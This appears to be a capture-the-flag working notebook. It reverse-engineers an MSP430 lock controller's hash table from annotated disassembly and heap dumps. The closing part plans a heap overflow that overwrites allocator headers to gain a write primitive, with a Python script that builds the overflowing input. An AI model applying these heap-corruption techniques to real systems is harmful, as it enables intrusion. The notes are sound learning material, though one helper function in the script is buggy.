Command should be (We should use the full word because the diff are hard coded):
	a for 'access'
	n for 'new' (I guess)

access tzury 1234;5678
Should try:
access tzury 1234

new tzury 678
Adding user account ury with pin 02a6.
access tzury 02a6
	"Access denied"
access tzury 678
	Access granted; but account not activated.
new tzury 678;access tzury 02a6;access tzury 678

4b66 <run>
## Init -> r8 store the hash table location 0x3 and 0x5 are some default initial value
	4b66:  0b12           push	r11
	4b68:  0a12           push	r10
	4b6a:  0912           push	r9
	4b6c:  0812           push	r8
	4b6e:  0712           push	r7
	4b70:  3150 00fa      add	#0xfa00, sp // - 0x600
	4b74:  3e40 0500      mov	#0x5, r14
	4b78:  3f40 0300      mov	#0x3, r15
	4b7c:  b012 7847      call	#0x4778 <create_hash_table>
	4b80:  084f           mov	r15, r8  // I guess r8 is the address of the hash table or something like that
## Print instructions
	4b82:  3f40 384a      mov	#0x4a38, r15
	4b86:  b012 504d      call	#0x4d50 <puts> // "Welcome to the lock controller."
	4b8a:  3f40 584a      mov	#0x4a58, r15
	4b8e:  b012 504d      call	#0x4d50 <puts> // "You can open the door by entering 'access [your name] [pin]'"
	4b92:  3f40 954a      mov	#0x4a95, r15
	4b96:  b012 504d      call	#0x4d50 <puts> // ""
## Zero sp -> sp + 0x5ff
	4b9a:  0e43           clr	r14
	4b9c:  3740 ff05      mov	#0x5ff, r7
	4ba0:  053c           jmp	$+0xc <run+0x46> // 0x4bac
	4ba2:  0f41           mov	sp, r15
	4ba4:  0f5e           add	r14, r15
	4ba6:  cf43 0000      mov.b	#0x0, 0x0(r15)
	4baa:  1e53           inc	r14
	4bac:  079e           cmp	r14, r7
	4bae:  f937           jge	$-0xc <run+0x3c> // 0x4ba2
## Read to the stack in length 0f 0x550 (A little shorter then zeroed)
	4bb0:  3e40 5005      mov	#0x550, r14
	4bb4:  0f41           mov	sp, r15
	4bb6:  b012 404d      call	#0x4d40 <getsn>
	4bba:  0b41           mov	sp, r11
	4bbc:  923c           jmp	$+0x126 <run+0x17c> // 0x4ce2
## Check the first letter is 'a' to make sure the command is "access"
	4bbe:  7f90 6100      cmp.b	#0x61, r15          // 'a'
	4bc2:  3a20           jnz	$+0x76 <run+0xd2>   // 0x4c38
## Zero the space after'[your name]' and store the pin start at r11
	4bc4:  0e4b           mov	r11, r14
	4bc6:  3e50 0700      add	#0x7, r14
	4bca:  0b4e           mov	r14, r11
	4bcc:  073c           jmp	$+0x10 <run+0x76>   // 0x4bdc
	4bce:  7f90 2000      cmp.b	#0x20, r15         // ' '
	4bd2:  0320           jnz	$+0x8 <run+0x74>  // 0x4bda
	4bd4:  cb43 0000      mov.b	#0x0, 0x0(r11)
	4bd8:  043c           jmp	$+0xa <run+0x7c>  // 0x4be2
	4bda:  1b53           inc	r11
	4bdc:  6f4b           mov.b	@r11, r15
	4bde:  4f93           tst.b	r15
	4be0:  f623           jnz	$-0x12 <run+0x68> // 0x4bce
	4be2:  1b53           inc	r11
	4be4:  0a43           clr	r10
	4be6:  0b3c           jmp	$+0x18 <run+0x98> // 0x4bfe
## Calc pin from given passwrod 0x0 or ';'
	4be8:  0d4a           mov	r10, r13    // r13=r10=i
	4bea:  0d5d           add	r13, r13    // r13 = 2*r13
	4bec:  0d5d           add	r13, r13    // r13 = 4*r13
	4bee:  0d5a           add	r10, r13    // r13 = 5*r13
	4bf0:  0d5d           add	r13, r13    // r13 = 0xa*r13
	4bf2:  6a4b           mov.b	@r11, r10
	4bf4:  8a11           sxt	r10
	4bf6:  3a50 d0ff      add	#0xffd0, r10  // r10 = r10 - 0x30
	4bfa:  0a5d           add	r13, r10
	4bfc:  1b53           inc	r11
	4bfe:  6f4b           mov.b	@r11, r15
	4c00:  4f93           tst.b	r15                // 0x0
	4c02:  0324           jz	$+0x8 <run+0xa4>   // 0x4c0a
	4c04:  7f90 3b00      cmp.b	#0x3b, r15         // ';'
	4c08:  ef23           jnz	$-0x20 <run+0x82>  // 0x4be8
4c0a:  0f48           mov	r8, r15
4c0c:  b012 cc49      call	#0x49cc <get_from_table>
4c10:  3f93           cmp	#-0x1, r15
4c12:  0320           jnz	$+0x8 <run+0xb4>     // 0x4c1a
4c14:  3f40 964a      mov	#0x4a96, r15         // "No such box"
4c18:  413c           jmp	$+0x84 <run+0x136>   // 0x4c9c --> puts

4c1a:  0aef           xor	r15, r10          // Xor calculated pin with the one from the table
4c1c:  3af0 ff7f      and	#0x7fff, r10
4c20:  0820           jnz	$+0x12 <run+0xcc> // 0x4c32
4c22:  0f9a           cmp	r10, r15
4c24:  0334           jge	$+0x8 <run+0xc6> // 0x4c2c
4c26:  3f40 a34a      mov	#0x4aa3, r15         // "Access granted"
4c2a:  383c           jmp	$+0x72 <run+0x136>   // 0x4c9c --> puts
4c2c:  3f40 b34a      mov	#0x4ab3, r15         // "Access granted; but account not activated"	
4c30:  353c           jmp	$+0x6c <run+0x136>   // 0x4c9c --> puts
4c32:  3f40 de4a      mov	#0x4ade, r15         // "Aceess denied.Can not have a pin with high bit set."
4c36:  323c           jmp	$+0x66 <run+0x136>   // 0x4c9c --> puts

4c38:  7f90 6e00      cmp.b	#0x6e, r15           // 'n'
4c3c:  4020           jnz	$+0x82 <run+0x158> // 0x4cbe --> Invalid command

4c3e:  094b           mov	r11, r9
4c40:  2952           add	#0x4, r9
4c42:  0b49           mov	r9, r11
4c44:  073c           jmp	$+0x10 <run+0xee> // 0x4c54
4c46:  7f90 2000      cmp.b	#0x20, r15           // ' '
4c4a:  0320           jnz	$+0x8 <run+0xec> // 0x4c52
4c4c:  cb43 0000      mov.b	#0x0, 0x0(r11)
4c50:  043c           jmp	$+0xa <run+0xf4> // 0x4c5a
4c52:  1b53           inc	r11
4c54:  6f4b           mov.b	@r11, r15
4c56:  4f93           tst.b	r15
4c58:  f623           jnz	$-0x12 <run+0xe0> // 0x4c46
4c5a:  1b53           inc	r11
## Calc pin - I guess it would be usefull to undertand when using it to overflow
	4c5c:  0a43           clr	r10
	4c5e:  0b3c           jmp	$+0x18 <run+0x110> // 0x4c76
	4c60:  0c4a           mov	r10, r12
	4c62:  0c5c           add	r12, r12
	4c64:  0c5c           add	r12, r12
	4c66:  0c5a           add	r10, r12
	4c68:  0c5c           add	r12, r12
	4c6a:  6a4b           mov.b	@r11, r10
	4c6c:  8a11           sxt	r10
	4c6e:  3a50 d0ff      add	#0xffd0, r10      // -0x30
	4c72:  0a5c           add	r12, r10
	4c74:  1b53           inc	r11
	4c76:  6f4b           mov.b	@r11, r15
	4c78:  4f93           tst.b	r15
	4c7a:  0324           jz	$+0x8 <run+0x11c> // 0x4c82
	4c7c:  7f90 3b00      cmp.b	#0x3b, r15            // ';'
	4c80:  ef23           jnz	$-0x20 <run+0xfa> // 0x4c60
	4c82:  0a93           tst	r10
	4c84:  0334           jge	$+0x8 <run+0x126> // 0x4c8c
4c86:  3f40 ec4a      mov	#0x4aec, r15      // "Can not have a pin with high bit set.""
4c8a:  083c           jmp	$+0x12 <run+0x136> // 0x4c9c --> puts
### Check if user exists
	4c8c:  0e49           mov	r9, r14
	4c8e:  0f48           mov	r8, r15
	4c90:  b012 cc49      call	#0x49cc <get_from_table>
	4c94:  3f93           cmp	#-0x1, r15
	4c96:  0524           jz	$+0xc <run+0x13c> // 0x4ca2
	4c98:  3f40 124b      mov	#0x4b12, r15      // "User already has an account."
	4c9c:  b012 504d      call	#0x4d50 <puts>
	4ca0:  1c3c           jmp	$+0x3a <run+0x174>  // 0x4cda --> Next command
## Adding user
	4ca2:  0a12           push	r10                 // Pin
	4ca4:  0912           push	r9                  // User account
	4ca6:  3012 2f4b      push	#0x4b2f			    // "Adding user account %s with pin %x."
	4caa:  b012 4844      call	#0x4448 <printf>
	4cae:  3150 0600      add	#0x6, sp
	4cb2:  0d4a           mov	r10, r13
	4cb4:  0e49           mov	r9, r14
	4cb6:  0f48           mov	r8, r15
	4cb8:  b012 3248      call	#0x4832 <add_to_table>
	4cbc:  0e3c           jmp	$+0x1e <run+0x174> // 0x4cda
## Invalid command - Stop loop
	4cbe:  3f40 544b      mov	#0x4b54, r15       // "Invalid command"
	4cc2:  b012 504d      call	#0x4d50 <puts>
	4cc6:  1f43           mov	#0x1, r15
## Exit
	4cc8:  3150 0006      add	#0x600, sp  // return the stack to normal and exit
	4ccc:  3741           pop	r7
	4cce:  3841           pop	r8
	4cd0:  3941           pop	r9
	4cd2:  3a41           pop	r10
	4cd4:  3b41           pop	r11
	4cd6:  3041           ret
## Finish rootine
	4cd8:  1b53           inc	r11
	4cda:  fb90 3b00 0000 cmp.b	#0x3b, 0x0(r11)    // ';'
	4ce0:  fb27           jz	$-0x8 <run+0x172> // 0x4cd8
	4ce2:  6f4b           mov.b	@r11, r15
	4ce4:  4f93           tst.b	r15
	4ce6:  6b23           jnz	$-0x128 <run+0x58> // 0x4bbe --> Read the next command
	4ce8:  0e43           clr	r14
	4cea:  603f           jmp	$-0x13e <run+0x46> // 0x4bac --> Get inpuy again

## Table Ops:
	<create_hash_table>
	<add_to_table>
	<get_from_table>

Header is:
	01234567           89
	000305<FirstMalloc><SeconedMalloc>
The first 2 byte used for 2^x initials keys
The seconed 2 byte used for the amount of items (y) in each key
Total Items in the hash_table is (2^x) * y = (2^3) * 5 = 8*5=40 
First malloc used for 0x8 pointers
	Each pointer point to a buffer in size 0x5a
		Each buffer is list of 5 items in size of 0x12
			Each item !! Should be understood better !!
				first 0x10 bytes used for the username
				last 2 bytes is the data
Seconed malloc used for 0x8 indexCounter
.
r15 - effect the amount of enteries
r14 - some size
4778 <create_hash_table>
## Init
	4778:  0b12           push	r11
	477a:  0a12           push	r10
	477c:  0912           push	r9
	477e:  0812           push	r8
	4780:  0712           push	r7
	4782:  0612           push	r6
	4784:  074f           mov	r15, r7  // 0x03 -- Looks like some size
	4786:  094e           mov	r14, r9  // 0x05 -- Looks like some seed
## Allocate header (0x10)
	4788:  3f40 0a00      mov	#0xa, r15  // alloc 0xa (10)
	478c:  b012 7846      call	#0x4678 <malloc>
	4790:  0a4f           mov	r15, r10
	4792:  8f43 0000      clr	0x0(r15)
	4796:  8f47 0200      mov	r7, 0x2(r15)
	479a:  8f49 0400      mov	r9, 0x4(r15)
## r11 = 2^(r7+1) = 2^4 = 16 = 0x10
	479e:  2b43           mov	#0x2, r11
	47a0:  0f47           mov	r7, r15 // 0x03
	47a2:  0f93           tst	r15
	47a4:  0324           jz	$+0x8 <create_hash_table+0x34>  // 0x47ac
	47a6:  0b5b           add	r11, r11
	47a8:  1f83           dec	r15
	47aa:  fd23           jnz	$-0x4 <create_hash_table+0x2e>  // 0x47a6
## Allocate 0x10 twice
	47ac:  0f4b           mov	r11, r15
	47ae:  b012 7846      call	#0x4678 <malloc>
	47b2:  8a4f 0600      mov	r15, 0x6(r10)
	47b6:  0f4b           mov	r11, r15
	47b8:  b012 7846      call	#0x4678 <malloc>
	47bc:  8a4f 0800      mov	r15, 0x8(r10)
## r8 = 2^(r7) = 2^3 = 8
	47c0:  1843           mov	#0x1, r8
	47c2:  0793           tst	r7
	47c4:  0324           jz	$+0x8 <create_hash_table+0x54>  // 0x47cc
	47c6:  0858           add	r8, r8
	47c8:  1783           dec	r7
	47ca:  fd23           jnz	$-0x4 <create_hash_table+0x4e>  // 0x47c6
## r11 = 18 * r9 = 0x12 * 5 = 90 = 0x5a
	47cc:  0b49           mov	r9, r11   // r9
	47ce:  0b5b           add	r11, r11  // 2r9
	47d0:  0b5b           add	r11, r11  // 4r9
	47d2:  0b5b           add	r11, r11  // 8r9
	47d4:  0b59           add	r9, r11   // 9r9
	47d6:  0b5b           add	r11, r11  // 18r9
	47d8:  0943           clr	r9
## Malloc r11=0x5a for r8=0x8 times -> (0x5a = 0x12 * 5)
### First allocation used for pointers to more allocations, seconed allocation used as "used?"
	47da:  0f3c           jmp	$+0x20 <create_hash_table+0x82>  // 0x47fa
	47dc:  0749           mov	r9, r7 // r7 = index
	47de:  0757           add	r7, r7 // r7 = 2 * index
	47e0:  164a 0600      mov	0x6(r10), r6 // r6 = firstMalloc
	47e4:  0657           add	r7, r6       // r6 = firstMalloc + 2 * index
	47e6:  0f4b           mov	r11, r15     // Malloc 18 * r9
	47e8:  b012 7846      call	#0x4678 <malloc>
	47ec:  864f 0000      mov	r15, 0x0(r6) // Store the malloc in the first allocation
	47f0:  175a 0800      add	0x8(r10), r7 // r7 = seconedMalloc + 2 * index
	47f4:  8743 0000      clr	0x0(r7)      // Zero this
	47f8:  1953           inc	r9
	47fa:  0998           cmp	r8, r9
	47fc:  ef3b           jl	$-0x20 <create_hash_table+0x64>  // 0x47dc
## Exit
	47fe:  0f4a           mov	r10, r15
	4800:  3641           pop	r6
	4802:  3741           pop	r7
	4804:  3841           pop	r8
	4806:  3941           pop	r9
	4808:  3a41           pop	r10
	480a:  3b41           pop	r11
	480c:  3041           ret

r13 - pin?
r14 - user account
r15 - hash_table address
4832 <add_to_table>
## Init -> r11=table, r10=user, r9=pin, r14=r15=03, r12=05
	4832:  0b12           push	r11
	4834:  0a12           push	r10
	4836:  0912           push	r9
	4838:  0b4f           mov	r15, r11
	483a:  0a4e           mov	r14, r10
	483c:  094d           mov	r13, r9
	483e:  1e4f 0200      mov	0x2(r15), r14
	4842:  1c4f 0400      mov	0x4(r15), r12
	4846:  0f4e           mov	r14, r15
## r12 = 2^r15 * r12 = 2^3 * 5 = 8 * 5 = 40
	4848:  0f93           tst	r15
	484a:  0324           jz	$+0x8 <add_to_table+0x20> // 0x4852
	484c:  0c5c           add	r12, r12
	484e:  1f83           dec	r15
	4850:  fd23           jnz	$-0x4 <add_to_table+0x1a> // 0x484c
## Check if the amount of items in the table is greater then 2* amount of keys, if so increase the amount of keys to 2^(i+1)
	4852:  0c93           tst	r12
	4854:  0234           jge	$+0x6 <add_to_table+0x28> // 0x485a
	4856:  3c50 0300      add	#0x3, r12                 // If r12 is zero, use 3 as default
	485a:  0c11           rra	r12                       // Divide by 2
	485c:  0c11           rra	r12                       // Divide by 2 -> 0x4(r15)
	485e:  2c9b           cmp	@r11, r12                 // If amount of items greater then amount of keys * 2 -> increase amount of keys and rehash
	4860:  0434           jge	$+0xa <add_to_table+0x38> // 0x486a
	4862:  1e53           inc	r14
	4864:  0f4b           mov	r11, r15
	4866:  b012 d448      call	#0x48d4 <rehash>
## Inc items counter, clac hash and store in r15
	486a:  9b53 0000      inc	0x0(r11)
	486e:  0f4a           mov	r10, r15
	4870:  b012 0e48      call	#0x480e <hash>
## r12 = 2^3 - 1 = 7
	4874:  1c43           mov	#0x1, r12
	4876:  1e4b 0200      mov	0x2(r11), r14
	487a:  0e93           tst	r14
	487c:  0324           jz	$+0x8 <add_to_table+0x52> // 0x4884
	487e:  0c5c           add	r12, r12
	4880:  1e83           dec	r14
	4882:  fd23           jnz	$-0x4 <add_to_table+0x4c> // 0x487e
	4884:  3c53           add	#-0x1, r12
## r12=index, r14=current_bucket_counter, r11=current_pointer_address
	## and
	4886:  0cff           and	r15, r12
	4888:  0c5c           add	r12, r12             // r12 = pin index = (hash ^ 0x7) * 2
	488a:  1f4b 0800      mov	0x8(r11), r15        // Counter
	488e:  0f5c           add	r12, r15
	4890:  2e4f           mov	@r15, r14            // r14=current backet counter
	4892:  1b4b 0600      mov	0x6(r11), r11        // Pointers
	4896:  0b5c           add	r12, r11
## r12 = new item address in inner buffer
	4898:  0c4e           mov	r14, r12 // counter
	489a:  0c5c           add	r12, r12 // 2 * counter
	489c:  0c5c           add	r12, r12 // 4 * counter
	489e:  0c5c           add	r12, r12 // 8 * counter
	48a0:  0c5e           add	r14, r12 // 9 * counter
	48a2:  0c5c           add	r12, r12 // 18 * counter = 0x12 * counter
	48a4:  2c5b           add	@r11, r12 // r12=new item address in inner buffer
	48a6:  1e53           inc	r14
	48a8:  8f4e 0000      mov	r14, 0x0(r15) 
## Copy user 0x10 first bytes or until 0x0
	48ac:  0f43           clr	r15 //r15 is current index
	48ae:  093c           jmp	$+0x14 <add_to_table+0x90> // 0x48c2
	48b0:  0b4c           mov	r12, r11 // r11=r12=new item address in inner buffer
	48b2:  0b5f           add	r15, r11 // r11=new_item_current_letter_address
	48b4:  cb4e 0000      mov.b	r14, 0x0(r11) // move letter to new address
	48b8:  1f53           inc	r15
	48ba:  3f90 0f00      cmp	#0xf, r15
	48be:  0424           jz	$+0xa <add_to_table+0x96> // 0x48c8
	48c0:  1a53           inc	r10
	48c2:  6e4a           mov.b	@r10, r14     // move letter to reg
	48c4:  4e93           tst.b	r14
	48c6:  f423           jnz	$-0x16 <add_to_table+0x7e> // 0x48b0
## Copy pin (given by param) to memeory
	48c8:  8c49 1000      mov	r9, 0x10(r12)
## Exit
	48cc:  3941           pop	r9
	48ce:  3a41           pop	r10
	48d0:  3b41           pop	r11
	48d2:  3041           ret

r14 - pin in ascii (I guess)
r15 - table
49cc <get_from_table>
## Init -> r10=table, r6=pin
	49cc:  0b12           push	r11
	49ce:  0a12           push	r10
	49d0:  0912           push	r9
	49d2:  0812           push	r8
	49d4:  0712           push	r7
	49d6:  0612           push	r6
	49d8:  0a4f           mov	r15, r10 
	49da:  064e           mov	r14, r6
## Hash Pin and store the hash in r15
	49dc:  0f4e           mov	r14, r15
	49de:  b012 0e48      call	#0x480e <hash>
## r11=2^3=0x08
	49e2:  1b43           mov	#0x1, r11
	49e4:  1d4a 0200      mov	0x2(r10), r13
	49e8:  0d93           tst	r13
	49ea:  0324           jz	$+0x8 <get_from_table+0x26>  // 0x49f2
	49ec:  0b5b           add	r11, r11
	49ee:  1d83           dec	r13
	49f0:  fd23           jnz	$-0x4 <get_from_table+0x20>  // 0x49ec
## Calc offset to real allocation r9 -> first real allocation, r11 -> index
	49f2:  3b53           add	#-0x1, r11 // r11 -= 1 -> r11 = 0x07 = 00000111
	49f4:  0bff           and	r15, r11   //  get pin last 3 bit (number between 0 to 7)
	49f6:  0b5b           add	r11, r11   // r11 = 2*(number between 0-7)
	49f8:  1d4a 0600      mov	0x6(r10), r13 // First Allocation - Pointers allocations
	49fc:  0d5b           add	r11, r13 // Point to current allocation address
	49fe:  294d           mov	@r13, r9 // r9 = Point to current allocation
	4a00:  0843           clr	r8
## Find suitable entry
	4a02:  0d3c           jmp	$+0x1c <get_from_table+0x52>  // 0x4a1e
	4a04:  0749           mov	r9, r7
	4a06:  0e49           mov	r9, r14
	4a08:  0f46           mov	r6, r15
	4a0a:  b012 7c4d      call	#0x4d7c <strcmp>              // Compare the current pointer with the pin
	4a0e:  3950 1200      add	#0x12, r9                     // add 0x12 (18) to the current pointer index -> check if this value point to the our pin -> if so found pointer
	4a12:  0f93           tst	r15                           // Found pointer!
	4a14:  0320           jnz	$+0x8 <get_from_table+0x50>   // 0x4a1c -> Not found
	4a16:  1f47 1000      mov	0x10(r7), r15                 // Return current alloction
	4a1a:  073c           jmp	$+0x10 <get_from_table+0x5e>  // 0x4a2a --> Success
	4a1c:  1853           inc	r8

	4a1e:  1f4a 0800      mov	0x8(r10), r15                 // Point to indexCounter allocation
	4a22:  0f5b           add	r11, r15                      // Add corrent index to is free
	4a24:  289f           cmp	@r15, r8                      // Compare the index with the the indexCounter real address
	4a26:  ee3b           jl	$-0x22 <get_from_table+0x38>  // 0x4a04
## Failed
	4a28:  3f43           mov	#-0x1, r15
## Exit
	4a2a:  3641           pop	r6
	4a2c:  3741           pop	r7
	4a2e:  3841           pop	r8
	4a30:  3941           pop	r9
	4a32:  3a41           pop	r10
	4a34:  3b41           pop	r11
	4a36:  3041           ret

```python
def calc_hash(username):
	_hash = 0
	for letter in username:
		letter = ord(letter)
		if 0x80 & letter != 0:
			letter = letter | 0xff00

		cur = letter + _hash
		_hash = 31 * cur

	return _hash % 0x10000

def find_index(username):
	_hash = find_index(username)
	return (0x7 ^ _hash)
```

480e <hash>
	480e:  0e4f           mov	r15, r14
	4810:  0f43           clr	r15
	4812:  0b3c           jmp	$+0x18 <hash+0x1c> // 0x482a
	4814:  6d4e           mov.b	@r14, r13          // Pin letter in index i
	4816:  8d11           sxt	r13                // Extended letter		
	4818:  0d5f           add	r15, r13           // r13 = ExtendedLetter + prevValue
	481a:  0f4d           mov	r13, r15           // r15 = r13
	481c:  0f5f           add	r15, r15           // r15 = 2(ExtendedLetter + prevValue)
	481e:  0f5f           add	r15, r15           // r15 = 4(ExtendedLetter + prevValue)
	4820:  0f5f           add	r15, r15           // r15 = 8(ExtendedLetter + prevValue)
	4822:  0f5f           add	r15, r15           // r15 = 16(ExtendedLetter + prevValue)
	4824:  0f5f           add	r15, r15           // r15 = 32(ExtendedLetter + prevValue)
	4826:  0f8d           sub	r13, r15           // r15 = 31(ExtendedLetter + prevValue)
	4828:  1e53           inc	r14
	482a:  ce93 0000      tst.b	0x0(r14)
	482e:  f223           jnz	$-0x1a <hash+0x6> 0x4814
	4830:  3041           ret

48d4 <rehash> -> rehash increase the amount of keys to 2^r14
## Init r15=r11=current_address r6=thired_byte r5=seventh_byte r4=nineth byte, store something in 0x2(r15)
	48d4:  0b12           push	r11
	48d6:  0a12           push	r10
	48d8:  0912           push	r9
	48da:  0812           push	r8
	48dc:  0712           push	r7
	48de:  0612           push	r6
	48e0:  0512           push	r5
	48e2:  0412           push	r4
	48e4:  2183           decd	sp
	48e6:  0b4f           mov	r15, r11
	48e8:  164f 0200      mov	0x2(r15), r6
	48ec:  154f 0600      mov	0x6(r15), r5
	48f0:  144f 0800      mov	0x8(r15), r4
## Update the table header
	48f4:  8f4e 0200      mov	r14, 0x2(r15)
## r10=2^r14
	48f8:  8f43 0000      clr	0x0(r15)
	48fc:  2a43           mov	#0x2, r10
	48fe:  0e93           tst	r14
	4900:  0324           jz	$+0x8 <rehash+0x34> // 0x4908
	4902:  0a5a           add	r10, r10
	4904:  1e83           dec	r14
	4906:  fd23           jnz	$-0x4 <rehash+0x2e> // 0x4902
## Allocate r10 size and update the table header
	4908:  0f4a           mov	r10, r15
	490a:  b012 7846      call	#0x4678 <malloc>
	490e:  8b4f 0600      mov	r15, 0x6(r11)
## Allocate r10 size and update the table header
	4912:  0f4a           mov	r10, r15
	4914:  b012 7846      call	#0x4678 <malloc>
	4918:  8b4f 0800      mov	r15, 0x8(r11)
## Allocate the new data buckets, store in the pointres allocation and set the backet counter
	491c:  0a43           clr	r10
	491e:  1843           mov	#0x1, r8
	4920:  173c           jmp	$+0x30 <rehash+0x7c> // 0x4950
	4922:  094a           mov	r10, r9
	4924:  0959           add	r9, r9
	4926:  174b 0600      mov	0x6(r11), r7    // r7=pointers allocations address
	492a:  0759           add	r9, r7          // r7=current index address
	492c:  1f4b 0400      mov	0x4(r11), r15   // r15 = amount of items in list
	4930:  0e4f           mov	r15, r14        // r14=15
	4932:  0e5e           add	r14, r14        // r14 = 2* r14
	4934:  0e5e           add	r14, r14        // r14 = 4* r14
	4936:  0e5e           add	r14, r14        // r14 = 8* r14
	4938:  0e5f           add	r15, r14        // r14 = 9 * r14 = 9 * amount of items in list
	493a:  0f4e           mov	r14, r15        // r15 = 9 * amount of items in list
	493c:  0f5f           add	r15, r15        // r15 = 18 * amount of items in list = 0x12 * amount of items in list
	493e:  b012 7846      call	#0x4678 <malloc>
	4942:  874f 0000      mov	r15, 0x0(r7)    // copy new allocation pointer to the new pointers allocations
	4946:  195b 0800      add	0x8(r11), r9    ``
	494a:  8943 0000      clr	0x0(r9)         // Zero backet counter
	494e:  1a53           inc	r10
	4950:  1d4b 0200      mov	0x2(r11), r13   // Loop until index is equal to the new
	4954:  0e48           mov	r8, r14
	4956:  0d93           tst	r13
	4958:  0324           jz	$+0x8 <rehash+0x8c> // 0x4960
	495a:  0e5e           add	r14, r14
	495c:  1d83           dec	r13
	495e:  fd23           jnz	$-0x4 <rehash+0x86> // 0x495a
	4960:  0a9e           cmp	r14, r10
	4962:  df3b           jl	$-0x40 <rehash+0x4e> // 0x4922
## r14=previos amount of buckets
	4964:  0f46           mov	r6, r15             // r15 = previos 2^i amount of busckets
	4966:  1e43           mov	#0x1, r14
	4968:  0f93           tst	r15
	496a:  0324           jz	$+0x8 <rehash+0x9e> // 0x4972
	496c:  0e5e           add	r14, r14
	496e:  1f83           dec	r15
	4970:  fd23           jnz	$-0x4 <rehash+0x98> // 0x496c
##
4972:  814e 0000      mov	r14, 0x0(sp)
4976:  0a45           mov	r5, r10
4978:  0944           mov	r4, r9
497a:  0743           clr	r7
497c:  153c           jmp	$+0x2c <rehash+0xd4> // 0x49a8
497e:  2e4a           mov	@r10, r14
4980:  0e58           add	r8, r14
4982:  1d4e 1000      mov	0x10(r14), r13
4986:  0f4b           mov	r11, r15
4988:  b012 3248      call	#0x4832 <add_to_table>
498c:  1653           inc	r6
498e:  3850 1200      add	#0x12, r8
4992:  023c           jmp	$+0x6 <rehash+0xc4> // 0x4998
4994:  0843           clr	r8
4996:  0648           mov	r8, r6
4998:  2699           cmp	@r9, r6
499a:  f13b           jl	$-0x1c <rehash+0xaa> // 0x497e
499c:  2f4a           mov	@r10, r15
499e:  b012 1c47      call	#0x471c <free>
49a2:  1753           inc	r7
49a4:  2a53           incd	r10
49a6:  2953           incd	r9
49a8:  2791           cmp	@sp, r7
49aa:  f43b           jl	$-0x16 <rehash+0xc0> // 0x4994
## Free the previos pointers and counter allocations
	49ac:  0f44           mov	r4, r15
	49ae:  b012 1c47      call	#0x471c <free>
	49b2:  0f45           mov	r5, r15
	49b4:  b012 1c47      call	#0x471c <free>
## Exit
	49b8:  2153           incd	sp
	49ba:  3441           pop	r4
	49bc:  3541           pop	r5
	49be:  3641           pop	r6
	49c0:  3741           pop	r7
	49c2:  3841           pop	r8
	49c4:  3941           pop	r9
	49c6:  3a41           pop	r10
	49c8:  3b41           pop	r11
	49ca:  3041           ret

# Suggested solution
Overflow the header in a way that the next mallocs will keep working and the first
Then use the copied data to overwrite the original heap headers values to use the write primitve when freeing (same as in Algeirs)

Original heap header: 3c50 fc50 b500
I want point to the next one in the original header, mark this one as free so it would use it as the new allocated area
The new header will be 4250 fc50 b400

```python
commands = []
for i in range(12):
	c =f'new {0x10*(hex(i)[-1:])} 123'
	if i == 5:
	# if True:
		c = f'new \x42\x50\xfc\x50\xb42 123'

	commands.append(c)

command = ';'.join(commands)
print(command)
print(command.encode().hex())

"""
new 0000000000000000 123;new 1111111111111111 123;new 2222222222222222 123;new 3333333333333333 123;new 4444444444444444 123;new <PýPµ 123;new 6666666666666666 123;new 7777777777777777 123;new 8888888888888888 123;new 9999999999999999 123;new aaaaaaaaaaaaaaaa 123;new bbbbbbbbbbbbbbbb 123
6e65772030303030303030303030303030303030203132333b6e65772031313131313131313131313131313131203132333b6e65772032323232323232323232323232323232203132333b6e65772033333333333333333333333333333333203132333b6e65772034343434343434343434343434343434203132333b6e6577203c50c3bd50c2b500203132333b6e65772036363636363636363636363636363636203132333b6e65772037373737373737373737373737373737203132333b6e65772038383838383838383838383838383838203132333b6e65772039393939393939393939393939393939203132333b6e65772061616161616161616161616161616161203132333b6e6577206262626262626262626262626262626220313233
"""
5090: 3434 3434 3434 3434 3400 7b00 3c50 fc50   444444444.{.<P.P
50a0: b500 4250 c3bc 50c2 b432 0000 0000 0000   ..BP..P..2......

```

# A bit fuzzing --> We can overflow the heap with more items in bucket then the max size!!!!
## The question is how to use this overflow
## Lesson: maybe I should try fussing earlier, but then i wouldnt now what the key number and what triger it
new 0000000000000000 123;new 1111111111111111 123;new 2222222222222222 123;new 3333333333333333 123;new 4444444444444444 123;new 5555555555555555 123;new 6666666666666666 123;new 7777777777777777 123;new 8888888888888888 123;new 9999999999999999 123

      Pre  Next Len  Tabel header   Pnt  Cntr
5000: 0050 1050 1500 0a00 0300 0500 1650 2c50   .P.P.........P,P
      Pre  Next Len  Pntrs
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&P!.BP.P.QbQ.Q
                     Pre  Next Len  Cntr
5020: 2252 8252 e252 1050 3c50 2100 0a00 0000   "R.R.R.P<P!.....
                                    Pre  Next
5030: 0000 0000 0000 0000 0000 0000 2650 9c50   ............&P.P
      Len
5040: b500 3030 3030 3030 3030 3030 3030 3030   ..00000000000000
5050: 3000 7b00 3131 3131 3131 3131 3131 3131   0.{.111111111111
5060: 3131 3100 7b00 3232 3232 3232 3232 3232   111.{.2222222222
5070: 3232 3232 3200 7b00 3333 3333 3333 3333   22222.{.33333333
5080: 3333 3333 3333 3300 7b00 3434 3434 3434   3333333.{.444444
                                    Pre  Next
5090: 3434 3434 3434 3434 3400 7b00 3535 3535   444444444.{.5555
      Len
50a0: 3535 3535 3535 3535 3535 3500 7b00 3636   55555555555.{.66
50b0: 3636 3636 3636 3636 3636 3636 3600 7b00   6666666666666.{.
50c0: 3737 3737 3737 3737 3737 3737 3737 3700   777777777777777.
50d0: 7b00 3838 3838 3838 3838 3838 3838 3838   {.88888888888888
50e0: 3800 7b00 3939 3939 3939 3939 3939 3939   8.{.999999999999
                                    Pre  Next
50f0: 3939 3900 7b00 0000 0000 0000 9c50 5c51   999.{........P\Q
      Len
5100: b500 0000 0000 0000 0000 0000 0000 0000   ................
5110: 0000 0000 0000 0000 0000 0000 0000 0000   ................

new aaaaaaaaaaaaaaaa 123

5000: 0050 1050 1500 0b00 0300 0500 1650 2c50   .P.P.........P,P

new bbbbbbbbbbbbbbbb 123

Heap exausted; aborting.
5000: 0050 1050 1500 0000 0400 0500 1650 2c50   .P.P.........P,P
5010: 0050 2650 2100 4250 a250 0251 6251 c251   .P&P!.BP.P.QbQ.Q
5020: 2252 8252 e252 1050 3c50 2100 0b00 0000   "R.R.R.P<P!.....
5030: 0000 0000 0000 0000 0000 0000 2650 9c50   ............&P.P
5040: b500 3030 3030 3030 3030 3030 3030 3030   ..00000000000000
5050: 3000 7b00 3131 3131 3131 3131 3131 3131   0.{.111111111111
